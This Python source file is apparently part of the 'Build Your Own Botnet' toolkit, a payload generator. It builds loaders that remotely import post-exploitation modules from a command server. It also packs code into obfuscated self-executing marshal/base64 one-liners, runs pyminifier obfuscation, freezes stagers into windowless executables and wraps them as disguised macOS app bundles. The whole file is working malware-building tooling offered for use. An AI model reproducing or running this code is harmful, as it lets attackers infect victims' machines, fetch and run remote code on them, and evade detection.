#!/usr/bin/python
# -*- coding: utf-8 -*-
'Build Your Own Botnet'

# standard library
import os
import sys
import time
import zlib
import base64
import string
import random
import marshal
import tempfile
import subprocess

# modules
import util

# templates
template_main  = string.Template("""
if __name__ == '__main__':
    _${VARIABLE} = ${FUNCTION}(${OPTIONS})
    """)

template_load = string.Template("""
# remotely import dependencies from server

packages = ${PACKAGES}
packages_tmp = ${PACKAGES}

for package in packages_tmp:
    try:
        exec("import %s" % package, globals())
        packages.remove(package)
    except: pass

with remote_repo(packages, base_url=${BASE_URL}):
    for package in packages:
        try:
            exec("import %s" % package, globals())
        except: pass
""")

template_plist = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleDevelopmentRegion</key>
<string>English</string>
<key>CFBundleExecutable</key>
<string>${BASE_NAME}</string>
<key>CFBundleGetInfoString</key>
<string>${BUNDLE_VERSION}</string>
<key>CFBundleIconFile</key>
<string>${ICON_PATH}</string>
<key>CFBundleIdentifier</key>
<string>${BUNDLE_ID}}</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundleName</key>
<string>${BUNDLE_NAME}</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleShortVersionString</key>
<string>${BUNDLE_VERSION}</string>
<key>CFBundleSignature</key>
<string>????</string>
<key>CFBundleVersion</key>
<string>${VERSION}</string>
<key>NSAppleScriptEnabled</key>
<string>YES</string>
<key>NSMainNibFile</key>
<string>MainMenu</string>
<key>NSPrincipalClass</key>
<string>NSApplication</string>
</dict>
</plist>
""")

template_spec = string.Template("""# -*- mode: python -*-
block_cipher = pyi_crypto.PyiBlockCipher(key=${KEY})
a = Analysis([${BASENAME}],
             pathex=[${PATH}],
             binaries=[],
             datas=[],
             hiddenimports=${IMPORTS},
             hookspath=[],
             runtime_hooks=[],
             excludes=['site'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name=${NAME},
          debug=False,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          console=False, icon=${ICON})
""")

# main
def compress(input):
    """
    Zip-compress output into self-executing script

    `Requires`
    :param str input:    input code to compress

    Returns compressed output as a string

    """
    return "import zlib,base64,marshal;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9))))

def obfuscate(input):
    """
    Obfuscate and minimize memory footprint of output

    `Requires`
    :param str input:    input code to obfuscate

    Returns obfuscated output as a string

    """
    if os.path.isfile(input):
        input = open(input, 'r').read()
    temp = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
    temp.file.write(input)
    temp.file.close()
    name = os.path.join(tempfile.gettempdir(), temp.name)
    obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-variables --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
    obfs.wait()
    output = open(name, 'r').read().replace('# Created by pyminifier (https://github.com/liftoff/pyminifier)', '')
    os.remove(name)
    return output

def variable(length=6):
    """
    Generate a random alphanumeric variable name of given length

    `Optional`
    :param int length:    length of the variable name to generate

    Returns variable as a string

    """
    return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))

def main(function, *args, **kwargs):
    """
    Generate a simple code snippet to initialize a script

    if __name__ == "__main__":
        _function = Function(*args, **kwargs)

    `Required`
    :param str funciton:    function name

    `Optional`
    :param tuple args:      positional arguments
    :param dict kwargs:     keyword arguments

    Returns code snippet as a string

    """
    global template_main


    # Set up the string of parameters. Args are unnamed and **kwargs are named parameters
    options = ', '.join(args) + \
        str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('}') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items() if v != None) if len(kwargs) else '')

    # Substitute in the args and the function to the string and return it to write to file
    return template_main.substitute(VARIABLE=function.lower(), FUNCTION=function, OPTIONS=options)

def loader(host='127.0.0.1', port=1337, packages=[]):
    """
    Generate loader code which remotely imports the
    payload dependencies and post-exploitation modules

    `Required`
    :param str host:        server IP address
    :param int port:        server port number

    `Optional`
    :param list imports:    package/modules to remotely import

    """
    global template_load
    base_url = 'http://{}:{}'.format(host, port)
    return template_load.substitute(PACKAGES=repr(packages), BASE_URL=repr(base_url))

def freeze(filename, icon=None, hidden=None, debug=False):
    """
    Compile a Python file into a standalone executable
    binary with a built-in Python interpreter

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string

    """
    # global template_spec
    basename = os.path.basename(filename)
    name = os.path.splitext(basename)[0]
    path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')
    key = ''.join([random.choice([chr(i) for i in list(range(48,91)) + list(range(97,123))]) for _ in range(16)])

    # imports = []
    # with open(filename) as import_file:
    #     for potental_import in filter(None, (PI.strip().split() for PI in import_file)):
    #         if potental_import[0] == 'import':
    #             imports.append(potental_import[1].split(';')[0].split(','))

    # bad_imports = set()
    # bad_imports.add('core')
    # for i in os.listdir('core'):
    #     i = os.path.splitext(i)[0]
    #     bad_imports.add(i)
    #     bad_imports.add('core.%s' % i)

    # for imported in imports:
    #     if isinstance(imported, list):
    #         __ = imports.pop(imports.index(imported))
    #         for ___ in __:
    #             if ___ not in bad_imports:
    #                 imports.append(___)

    # imports = list(set(imports))
    # if isinstance(hidden, list):
    #     imports.extend(hidden)
    # spec = template_spec.substitute(KEY=repr(key), BASENAME=repr(basename), PATH=repr(path), IMPORTS=imports, NAME=repr(name), ICON=repr(icon))
    # fspec = os.path.join(path, name + '.spec')
    # with open(fspec, 'w') as fp:
    #     fp.write(spec)
    if debug:
        process = subprocess.Popen('{0} -m PyInstaller -d imports -d bootloader --log-level DEBUG --onefile --hidden-import="pkg_resources.py2_warn" {1}'.format(sys.executable, filename), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
    else:
        process = subprocess.Popen('{0} -m PyInstaller --noconsole --onefile --hidden-import="pkg_resources.py2_warn" {1}'.format(sys.executable, filename), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
    while True:
        try:
            line = process.stderr.readline().rstrip()
        except: 
            break
        if line.strip() != None:
            util.display(line, color='reset', style='dim')
            line = line.decode('utf-8')
            if 'EXE' in line and 'complete' in line:
                break
        time.sleep(0.25)
    output = os.path.join(path, 'dist', name + str('.exe' if os.name == 'nt' else ''))
    return output

def app(filename, icon=None):
    """
    Bundle the Python stager file into a Mac OS X application

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string
    """
    global template_plist
    version = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
    baseName = os.path.basename(filename)
    bundleName = os.path.splitext(baseName)[0]
    appPath = os.path.join(os.getcwd(), '{}.app'.format(bundleName))
    basePath = os.path.join(appPath, 'Contents')
    distPath = os.path.join(basePath, 'MacOS')
    rsrcPath = os.path.join(basePath, 'Resources')
    pkgPath = os.path.join(basePath, 'PkgInfo')
    plistPath = os.path.join(rsrcPath, 'Info.plist')
    iconPath = os.path.basename(icon) if icon else ''
    executable = os.path.join(distPath, filename)
    bundleVersion = bundleName + ' ' + version
    bundleIdentity = 'com.' + bundleName
    infoPlist = template_plist.substitute(BASE_NAME=baseName, BUNDLE_VERSION=bundleVersion, ICON_PATH=iconPath, BUNDLE_ID=bundleIdentity, BUNDLE_NAME=bundleName, VERSION=version)
    os.makedirs(distPath)
    os.mkdir(rsrcPath)
    with open(pkgPath, "w") as fp:
        fp.write("APPL????")
    with open(plistPath, "w") as fw:
        fw.write(infoPlist)
    os.rename(filename, os.path.join(distPath, baseName))
    return appPath
